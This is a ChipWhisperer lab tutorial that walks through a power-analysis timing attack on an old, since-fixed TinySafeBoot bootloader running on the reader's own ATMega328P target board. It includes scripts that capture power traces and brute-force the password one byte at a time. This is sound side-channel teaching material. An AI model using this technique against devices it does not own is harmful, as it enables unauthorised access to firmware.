.. _tutorialtimingpasswd:

Tutorial #B3-2: Timing Analysis with Power for Attacking TSB
============================================================

This tutorial will introduce you to breaking devices by determining when a device is performing certain operations. It will
break simple bootloaders which may otherwise seem 'secure' against password attacks. In particular this uses the excellent
`TinySafeBoot <http://jtxp.org/tech/tinysafeboot_en.htm>`_ bootloader for AVR microcontrollers. The example uses an old
release of TinySafeBoot, since newer releases do not have this vulnerability!

This tutorial can only be completed if you have an ATMega328P target - for example the CW301 Multi-Target board, or the CW304
NOTDuino board. It cannot be completed with the XMEGA target, as it relies on a 3rd-party bootloader. It uses the same principles
learned in :ref:`tutorialbasictimingpasswd`.

In addition this example shows you how to drive the ChipWhisperer software with a script, rather than using the GUI. This will
be required when attacking new devices which you have not yet added to the core ChipWhisperer software.

Note this is not a prerequisite to the tutorial on breaking AES. You can skip this tutorial if you wish.

Prerequisites
-------------

You should have already completed :ref:`tutorialtimingsimple` to gain a better understanding of the ChipWhisperer interface.

.. include:: tutorialbasic_setup.rsti

Finally program the microcontroller with the file used here:

7. Program the file ``tsb_m328p_d0d1_20140331.hex`` which is found at ``chipwhisperer\hardware\victims\firmware\tinysafeboot-20140331`` into
   the AVR microcontroller. You can find instructions for using the programming software in the :ref:`tutorialcomms` examples.

.. _testingserialbasic:

Testing the Serial Connection & Observing Power
-----------------------------------------------

These steps differ from previous steps, as we are not going to be using a built-in target. However you can refer to :ref:`tutorialcomms`
for general information on using the ChipWhisperer-Capture Interface.

1. Start ChipWhisperer-Capture

2. As the *Scope Module*, select the *ChipWhisperer/OpenADC* option

3. As the *Target Module*, select the *Simple Serial* option

4. Switch to the *Target Settings* tab, and as the *connection*, select the *ChipWhisperer* option

5. Run the scope connect (click the button labeled *Scope: DIS*). Only the scope should switch to
   *CON* and be green circles. *Do not press the master button like last time.*:

   .. image:: /images/tutorials/basic/timingpower/connectscope_1.png

   When you are done the software should look as follows:

   .. image:: /images/tutorials/basic/timingpower/connectscope_2.png

   We do not connect the 'target' as that would cause data to be sent to it, whereas we just want
   to listen on the power line while we manually send data.

6. From the *Tools* menu select *Open Terminal*, and press *Connect* on the terminal:

   .. image:: /images/tutorials/basic/timingpower/termconn.png

7. Switch back to the *Target Settings* tab, without closing the terminal window. Set the baud rate
   for both TX & RX to ``9600`` baud. Once you start using the terminal these values will switch to
   the actual baud rates in use (the hardware can only generate certain baud rates). You cannot use
   higher bauds for this tutorial as the combined error from the AVR code & ChipWhisperer serial port
   causes communications failures.

   .. image:: /images/tutorials/basic/timingpower/termbaud.png

8. In the *ChipWhisperer-Serial Terminal*, change the *TX on Enter* to *None*, as we don't want to
   send any character to terminate a string.

9. In the *ChipWhisperer-Serial Terminal*, check the *Show non-ASCII as hex* if not clicked.

    .. image:: /images/tutorials/basic/timingpower/term_settingssimple.png

10. Finally send the command ``@@@``, which is the login sequence for the TinySafeBoot bootloader. Simply type
    this in the input line, and press 'enter' to send. You will see the ``@@@`` echoed on the received data in
    a blue font.

11. The objective is to get the login response. You may have to send ``@@@`` a few times for this to be successful,
    the following figure shows an example where the the login worked after sending a second round of ``@@@``. You might
    get an invalid response your first time for example. The response should start with ``TSB``:

    .. image:: /images/tutorials/basic/timingpower/term_tsbresponse.png

    Note the red bytes are hexadecimal responses, which were converted since they were outside of valid range for ASCII
    data. The response from TinySafeBoot has the following meaning, with example values given for our implementation,
    note certain values may change if you use different versions of TSB:

    ==========   ============  =============================
     Byte Num      Value        Description
    ==========   ============  =============================
     1-3           'TSB'       Fixed string
     4-5            0x1C7F     Word indicating FW build
     6              0xF0       TSB Status
     7              0x1E       AVR Signature Byte
     8              0x95       AVR Signature Byte
     9              0x0F       AVR Signature Byte
     10             0x40       Page Size in word
     11-12          0x3EC0     App Flash size in words
     13-14          0x03FF     EEPROM Size in Bytes
     15-16          0xAAAA     Fixed Byte Sequence
     17             '!'        Confirmation Character
    ==========   ============  =============================


12. Finally, we want to monitor power when sending this sequence to the device. We'll need to configure a number of OpenADC
    settings for this. The following table shows these settings, please carefully go though and set each of these as given.
    Pay attention to the 'notes' section which has some additional information.

    =============================  ================  =====================  ==============================================================
     Group                             Item               Value                   Note
    =============================  ================  =====================  ==============================================================
     Gain Setting                    Setting          40
     Trigger Setup                   Mode             falling edge
     Trigger Setup                   Timeout          7                      Adjust as needed - gives you time to type in the other window
     ADC Clock                       Source           EXTCLK x1 via DCM      Will need to reset DCM later
     CW-Extra --> Trigger Pins       Front Panel A    Unchecked
     CW-Extra --> Trigger Pins       Target IO1       Checked                Only 'Target IO1 (Serial TXD)' should be checked
     CW-Extra                        Clock Source     Target IO-IN           Confirm 'Freq Counter' reads 7.37MHz in 'ADC Clock'
     ADC Clock                       Reset ADC DCM    Click Button           Confirm 'ADC Freq' is 7.37MHz, and 'DCM Locked' is checked
                                                                             after pressing button.
    =============================  ================  =====================  ==============================================================

13. Before attacking the real system, we'll need to confirm these settings will work. To do so we'll monitor the power consumption whilst
    operating the bootloader under normal conditions.

    With our system running, push the 'Capture 1' button. Notice it will go grey indicating the system is waiting for the trigger to occur:

    .. image:: /images/tutorials/basic/timingpower/captrig_wait.png

    The trigger in this case is when the 'TXD' line goes low, which means when we send data to the bootloader. At this time we'll monitor
    the power when sending the sequence of ``@@@`` used before. This is described in steps 15-17.

14. Prepare the serial window by typing ``@@@`` as before, but do not hit enter yet. We'll need to hit enter only after we arm the system.

15. Arm the system by pressing the 'Capture 1' button.

16. Before the capture times out (e.g. before the button stops being gray), quickly click on the serial terminal output line and press 'Enter'
    to send the command, or press the 'Send' button beside the terminal output line to send the ``@@@`` command. Note you can adjust the timeout
    in the *Trigger Setup* group of the *Scope Settings*.

    .. image:: /images/tutorials/basic/timingpower/captrig_example.png

17. If this works, you will see the power consumption on receiving the command. You'll notice two distinct power signatures, which may look something
    like this:

    .. image:: /images/tutorials/basic/timingpower/powertrace1.png

    Or:

    .. image:: /images/tutorials/basic/timingpower/powertrace2.png

    The scale on the bottom is in samples. Remember we set the sample clock to 7.37 MHz (same speed of the device), meaning each sample represents
    1 / 7.37E6 = 135.6nS. Our serial interface is running at approximately 9600 baud, meaning a single bit takes 1/9600 = 0.1042mS. Every byte requires
    10 bits (1 start bit, 8 data bits, 1 stop bit), meaning a single byte over the UART represents 1.042mS, or 7684 samples. Note that in the second
    figure the power consumption drops dramatically after 7000 samples, which would correspond to a single byte being received (remember we triggered
    the capture based on the start bit).

    The two power traces represent two different modes in the bootloader. In the first power trace the bootloader is waiting for the login sequence,
    and receives all three bytes of it before awaiting the next command. In the second power trace the bootloader is already waiting the command byte.
    Since ``@`` is not a valid command, when the bootloader receives the first ``@`` it simply jumps to the user program. The flash here is empty, which
    effectively performs ``nop`` type operations. You can see a dramatic reduction in power as soon as the microcontroller stops receiving the data.

    Be aware that the data begin sent in both cases is the exact same! The power consumption differences are solely because the microcontroller stops
    processing the incomming data. We'll exploit this to break a secret password in the final part of this experiment.


Setting a Password on the Bootloader
------------------------------------

The TinySafeBoot bootloader allows us to set a password. Doing so requires us to send a binary blob to the device - something which we cannot do
through a normal ASCII serial interface. This section will demonstrate how to use the command-line interface of the ChipWhisperer-Capture software
to perform advanced operations with Python.

This section assums you still have the setup from the previous part running. If you have closed the program, perform steps 1 - 11 again (you don't
need to configure the OpenADC settings).

1. Close the *ChipWhisperer-Serial Terminal* window.

2. Switch to the *Python Console* on the bottom. You can enter commands in the bottom line & hit enter to have them executed:

    .. image:: /images/tutorials/basic/timingpower/console.png

   As a test try just entering ``self``, which is a Python reference to the ChipWhisperer object. You can explore other options & Python will report
   the data-type, for example::

        >>> self
        <__main__.ChipWhispererCapture object at 0x05E27800>
        >>> self.target.driver.ser
        <chipwhisperer.capture.targets.SimpleSerial.SimpleSerial_ChipWhisperer object at 0x05E2BAF8>

3. You can also call methods. For example we can send a string with the following::

        >>> self.target.driver.ser.write("@@@")

4. And to retreive the data we would call the read() function, where we specify the number of bytes to attempt to read. As before if we fail to get
   a response you may need to resend the "@@@" prompt::

    >>> self.target.driver.ser.write("@@@")
    >>> self.target.driver.ser.read(255)
    u''
    >>> self.target.driver.ser.write("@@@")
    >>> self.target.driver.ser.read(255)
    u'TSB\x7f\x1c\xf0\x1e\x95\x0f@\xc0>\xff\x03\xaa\xaa!'

5. To make typing easier, create variables that point to the read and write functions::

    >>> read =  self.target.driver.ser.read
    >>> write =  self.target.driver.ser.write

6. To set the bootloader on TSB, we need to modify a special page of FLASH memory. First, ensure you've recently (e.g. within < 30 seconds) received the
   ``TSB`` signon prompt. If not resend the ``@@@`` string until the call to ``read(255)`` returns the ``TSB`` prompt. You should read the next step before
   doing this however.

7. Send the command 'c' to read the last page of flash. Rather than printing to console, simply save this to a variable::

    >>> write('c')
    >>> lastpage = read(255)
    >>> lastpage
    u'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff!'

   Success! You've managed to read the space where we'll store the user password. First, we need to now remove the trailing 'CONFIRM' character from the
   end, leaving us with a complete page::

    >>> lastpage = lastpage[:-1]

   Next, you should convert this to a bytearray which will make modifications easier. When converting we need to specify a character set as well::

    >>> lastpage = bytearray(lastpage, 'latin-1')

   You can now retreive individual bytes of the array & get the associated value::

    >>> lastpage[2]
    255

   Finally, let's set a two-character password of 'ce'. The password starts at offset 3, and is terminated by a 0xFF::

    >>> lastpage[3] = ord('c')
    >>> lastpage[4] = ord('e')
    >>> lastpage[5] = 255

   Because we are using bytearrays, we needed to use the ``ord()`` function to get the integer value associated with each character. We could have more
   directly written the password in if we had kept the original encoding. But often you need to modify byte-level values, meaning the ``bytearray()``
   conversion is a useful tool to know.

8. Finally we can write this back to the system. We need to send two commands to do this::

    >>> write('C')
    >>> write('!')
    >>> write(lastpage.decode('latin-1'))
    >>> read(255)
    u'?\xff\xff\xffce\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff!'
    >>> write('c')
    >>> read(255)
    u'\xff\xff\xffce\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
    \xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff!'

   Confirm that the ``ce`` sequence occurs at the start. If something else appears you may have the wrong password set in the device!

9. We now have a bootloader with a password protection. Be aware that if you enter the wrong password you will cause the bootloader to spin into
   an infinite loop! You can check the password (carefully) by executing the following commands:

    >>> write('q')
    >>> write('@@@')
    >>> read(255)
    u''
    >>> write('ce')
    >>> read(255)
    u'TSB\x7f\x1c\xf0\x1e\x95\x0f@\xc0>\xff\x03\xaa\xaa!'

   The ``q`` command causes the bootloader to quit & jump to the application. Since there is no application it re-enters the bootloader. The ``@@@``
   is our standard sign-on sequence. However the bootloader waits for the secret password before transmitting the sign-on sequence. Note how it's
   only after sending ``ce`` that the bootloader works.

Running External Tools
----------------------

The next step of this tutorial runs external tools. In particular we want to use the built-in AVR programmer to reset the AVR device, since we have
no other method of asserting reset on the target.

This assumes you have ``AVR Studio 4`` installed. If you are using another plaform you can simply modify these instructions to use the command-line
tool of your choice, such as ``avrdude``.

1. First, ensure the USB-A cable is plugged into the rear of the ChipWhisperer. You will have both the USB-A and USB-Mini connections on the ChipWhisperer
   connected to your computer.

2. Open a terminal, and attempt to run the command-line AVR tools. You may have to adjust the path for your specific machine binary location::

    cd "C:\Program Files (x86)\Atmel\AVR Tools\STK500"
    Stk500.exe -dATMega328p -s -cUSB
        STK500 command line programmer, v 2.4 Atmel Corp (C) 2004-2011.

        Connected to AVRISP mkII on port USB:000200212345
        Device parameters loaded
        Programming mode entered
        Signature is 0x1E 0x95 0x0F
        Programming mode left
        Connection to AVRISP mkII closed

   Note the signature was correctly read. As part of reading the signature the AVR device will be reset.

3. Next, we will run the programmer from a Python program. This will provide us with a method of resetting the AVR progmatically.

4. Create a new file named something like ``test_bootloader.py`` with the following contents. Again adjust path as required to point to your
   AVRStudio installation. Note on Windows the double-slash is due to the requirement of escaping the backslash inside the string::

    from subprocess import call

    def resetAVR():
        call(["C:\\Program Files (x86)\\Atmel\\AVR Tools\\STK500\\Stk500.exe",
              "-dATMega328p", "-s", "-cUSB"])

    resetAVR()

  Attempt to run this file & confirm it works as expected.

Scripting the Setup
-------------------

At this point we want to script the setup of the ChipWhisperer-Capture tool, along with pulling in our special utility which is capable
of resetting the AVR microcontroller.

1. Create a Python file with a structure such as the following::

    from subprocess import call
    import chipwhisperer.capture.ChipWhispererCapture as cwc
    from chipwhisperer.capture.scopes.ChipWhispererExtra import CWPLLDriver

    try:
        from PySide.QtCore import *
        from PySide.QtGui import *
    except ImportError:
        print "ERROR: PySide is required for this program"
        sys.exit()

    def pe():
        QCoreApplication.processEvents()

    def resetAVR():
        call(["C:\\Program Files (x86)\\Atmel\\AVR Tools\\STK500\\Stk500.exe",
              "-dATMega328p", "-s", "-cUSB"])


    #Make the application
    app = cwc.makeApplication()

    #If you DO NOT want to overwrite/use settings from the GUI version including
    #the recent files list, uncomment the following:
    #app.setApplicationName("Capture V2 Scripted")

    #Get main module
    cap = cwc.ChipWhispererCapture()

    #Show window - even if not used
    cap.show()

    #NB: Must call processEvents since we aren't using proper event loop
    pe()

    cap.setParameter(['Generic Settings', 'Scope Module', 'ChipWhisperer/OpenADC'])
    cap.setParameter(['Generic Settings', 'Target Module', 'Simple Serial'])
    cap.setParameter(['Target Connection', 'connection', 'ChipWhisperer'])

    #Load FW (must be configured in GUI first)
    cap.FWLoaderGo()

    #NOTE: You MUST add this call to pe() to process events. This is done automatically
    #for setParameter() calls, but everything else REQUIRES this, since if you don't
    #signals will NOT be processed correctly
    pe()

    #Connect to scope
    cap.doConDisScope(True)
    pe()

    #Connect to serial port
    ser = cap.target.driver.ser
    ser.con()

    #Set baud rate
    cap.setParameter(['Serial Port Settings', 'TX Baud', 9600])
    cap.setParameter(['Serial Port Settings', 'RX Baud', 9600])

    #Attach special method so we can call from GUI if wanted
    cap.resetAVR = resetAVR

    #Some useful commands to play with from GUI
    #self.resetAVR()
    #ser = self.target.driver.ser
    #ser.write("@@@")
    #ser.write("ce")
    #print ser.read(255)

    #Run Application
    app.exec_()

   This is a basic 'script', which is really just a Python program using the ChipWhisperer library. Save the script to a file & run this, which should open
   the ChipWhisperer-Capture window as before. Finally, let's once again configure the OpenADC for analog capture. Before doing this, switch to the
   **Script Commands** tab, and note there is already some script information being printed. We will make changes to the system and then observe additional
   data that gets printed here:

   .. image:: /images/tutorials/basic/timingpower/scriptcommands1.png

2. Follow step 13 from section :ref:`testingserialbasic`, which contains a number of settings for the OpenADC portion. After performing the
   commands, you will note that additional steps have been printed to the **Script Commands** window. For example your output might look something like this::

    ['OpenADC', 'Gain Setting', 'Setting', 45]
    ['OpenADC', 'Trigger Setup', 'Mode', 'falling edge']
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'EXTCLK x1 via DCM']
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Front Panel A', False]
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Target IO1 (Serial TXD)', True]
    ['CW Extra', 'CW Extra Settings', 'Clock Source', 'Target IO-IN']
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None]

   Note the format __changes slightly between releases__, and using the wrong format will cause errors. Thus you should copy the output from your specific
   application and note the exact list used here.

3. Insert these commands into our master script such we don't need to perform any manual configuration. Close the ChipWhisperer-Capture window, and find
   the following line in your script::

    #Connect to scope
    cap.doConDisScope(True)
    pe()

4. Copy and paste the list of commands into the script just below that::

    #Connect to scope
    cap.doConDisScope(True)
    pe()

    ['OpenADC', 'Gain Setting', 'Setting', 45]
    ['OpenADC', 'Trigger Setup', 'Mode', 'falling edge']
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'EXTCLK x1 via DCM']
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Front Panel A', False]
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Target IO1 (Serial TXD)', True]
    ['CW Extra', 'CW Extra Settings', 'Clock Source', 'Target IO-IN']
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None]

5. Convert the list into a Python list variable with a name, which is done by inserting a ``cmds = [`` on the line above, a ``,`` after each line, and a
   ``]`` after the final line::

    #Connect to scope
    cap.doConDisScope(True)
    pe()

    cmds = [
    ['OpenADC', 'Gain Setting', 'Setting', 45],
    ['OpenADC', 'Trigger Setup', 'Mode', 'falling edge'],
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'EXTCLK x1 via DCM'],
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Front Panel A', False],
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Target IO1 (Serial TXD)', True],
    ['CW Extra', 'CW Extra Settings', 'Clock Source', 'Target IO-IN'],
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None],
    ]

6. Add a loop to run each command on the system::

    #Connect to scope
    cap.doConDisScope(True)
    pe()

    cmds = [
    ['OpenADC', 'Gain Setting', 'Setting', 45],
    ['OpenADC', 'Trigger Setup', 'Mode', 'falling edge'],
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Source', 'EXTCLK x1 via DCM'],
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Front Panel A', False],
    ['CW Extra', 'CW Extra Settings', 'Trigger Pins', 'Target IO1 (Serial TXD)', True],
    ['CW Extra', 'CW Extra Settings', 'Clock Source', 'Target IO-IN'],
    ['OpenADC', 'Clock Setup', 'ADC Clock', 'Reset ADC DCM', None],
    ]

    for cmd in cmds: cap.setParameter(cmd)

7. Run your script again. You should see the system connect to the target, and also configure the OpenADC settings. You can confirm this by hitting the
   **Capture 1** button. You won't yet get very useful information, but it should give you some analog data after the timeout period.

8. Switch to the Python console in the running ChipWhisperer-Capture application. First create a shortcut for the serial port::

    >>> ser = self.target.driver.ser

   Then run the following commands::

    >>> self.resetAVR()
    >>> ser.write("@@@")

   At this point the system is waiting for a correct password. Put the following text into the Python console but do not hit enter yet::

    ser.write("ce")

9. With the ``ser.write("ce")`` still not yet sent, hit the **Capture 1** button. Then hit enter on the Python console to send the ``ser.write("ce")``
   command. The system should trigger immediatly and capture a power trace, which might look something like this:

   .. image:: /images/tutorials/basic/timingpower/trace_passwordok.png

   To re-run the capture, perform the same sequence of commands in steps 8 & 9. You should get an almost identical trace each time you do this.

10. Now perform the same sequence (e.g. ``self.resetAVR()``, ``ser.write("@@@")``). But instead of sending the correct password "ce", send an incorrect
    password such as "ff". You should now see a power trace such as this:

    .. image:: /images/tutorials/basic/timingpower/trace_password_firstwrong.png

    Notice the start difference! You can examin the bootloader source to get an idea why this occurs. In particular the portion dealing with the
    password check looks like this::

        CheckPW:
        chpw1:
                lpm tmp3, z+                    ; load character from Flash
                cpi tmp3, 255                   ; byte value (255) indicates
                breq chpwx                      ; end of password -> exit
                rcall Receivebyte               ; else receive next character
        chpw2:
                cp tmp3, tmp1                   ; compare with password
                breq chpw1                      ; if equal check next character
                cpi tmp1, 0                     ; or was it 0 (emergency erase)
        chpwl:  brne chpwl                      ; if not, loop infinitely
                rcall RequestConfirmation       ; if yes, request confirm

    Note as soon as you get a wrong character, the reception of characters stops.

11. Perform the same experiment, but send the first character right and the second character wrong. So send "cf" for example as the password::

     >>> self.resetAVR()
     >>> ser.write("@@@")
     ---Push Capture 1 Button---
     >>> ser.write("cf")

    The results will again have a sharp drop in power after the reception of the second character:

    .. image:: /images/tutorials/basic/timingpower/trace_password_secondwrong.png


Thus by looking at the power consumption, we can determine the wrong password character. This makes it possible to brute-force the password, since we
can simply guess a single digit of the password at a time.

Scripting the Complete Attack
-----------------------------

The current script sets up the application, then runs the GUI normally at this line::

    #Run Application
    app.exec_()

As a beginning point, the following allows you to manually specify two characters for the password. These characters are put into the system, and
based on a simple power threshold it decides where the password failed. This script would be the same as your previous script, but replace the above
call with::

    num1 = ord('c')
    num2 = ord('f')

    cap.resetAVR()
    time.sleep(0.1)
    ser.write("@@@")
    time.sleep(0.1)
    cap.scope.arm()
    pe()
    ser.write(chr(num1) + chr(num2))
    if cap.scope.capture(update=True, NumberPoints=None, waitingCallback=pe):
        print "Timeout"
    else:
        print "Capture OK"

    if min(cap.scope.datapoints[10000:14000]) > -0.1:
        print "Byte 1 Wrong"

    elif min(cap.scope.datapoints[18000:22000]) > -0.1:
        print "Byte 2 Wrong"

    else:
        print "Password OK? Check response on serial"

    #print ser.read(255)

    #Run Application
    app.exec_()

    #Disconnect before exit to save grief
    cap.scope.dis()
    cap.target.dis()

You will need to adjust the thresholds and possibly data point locations based on your own experiments. With this you should be able to make a script
which brute-forces the password by breaking the first byte and then the second byte.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for performing timing attacks. A bootloader with a simple password-based security
system is broken. In addition you have learned about the scripting support in the ChipWhisperer-Capture software.

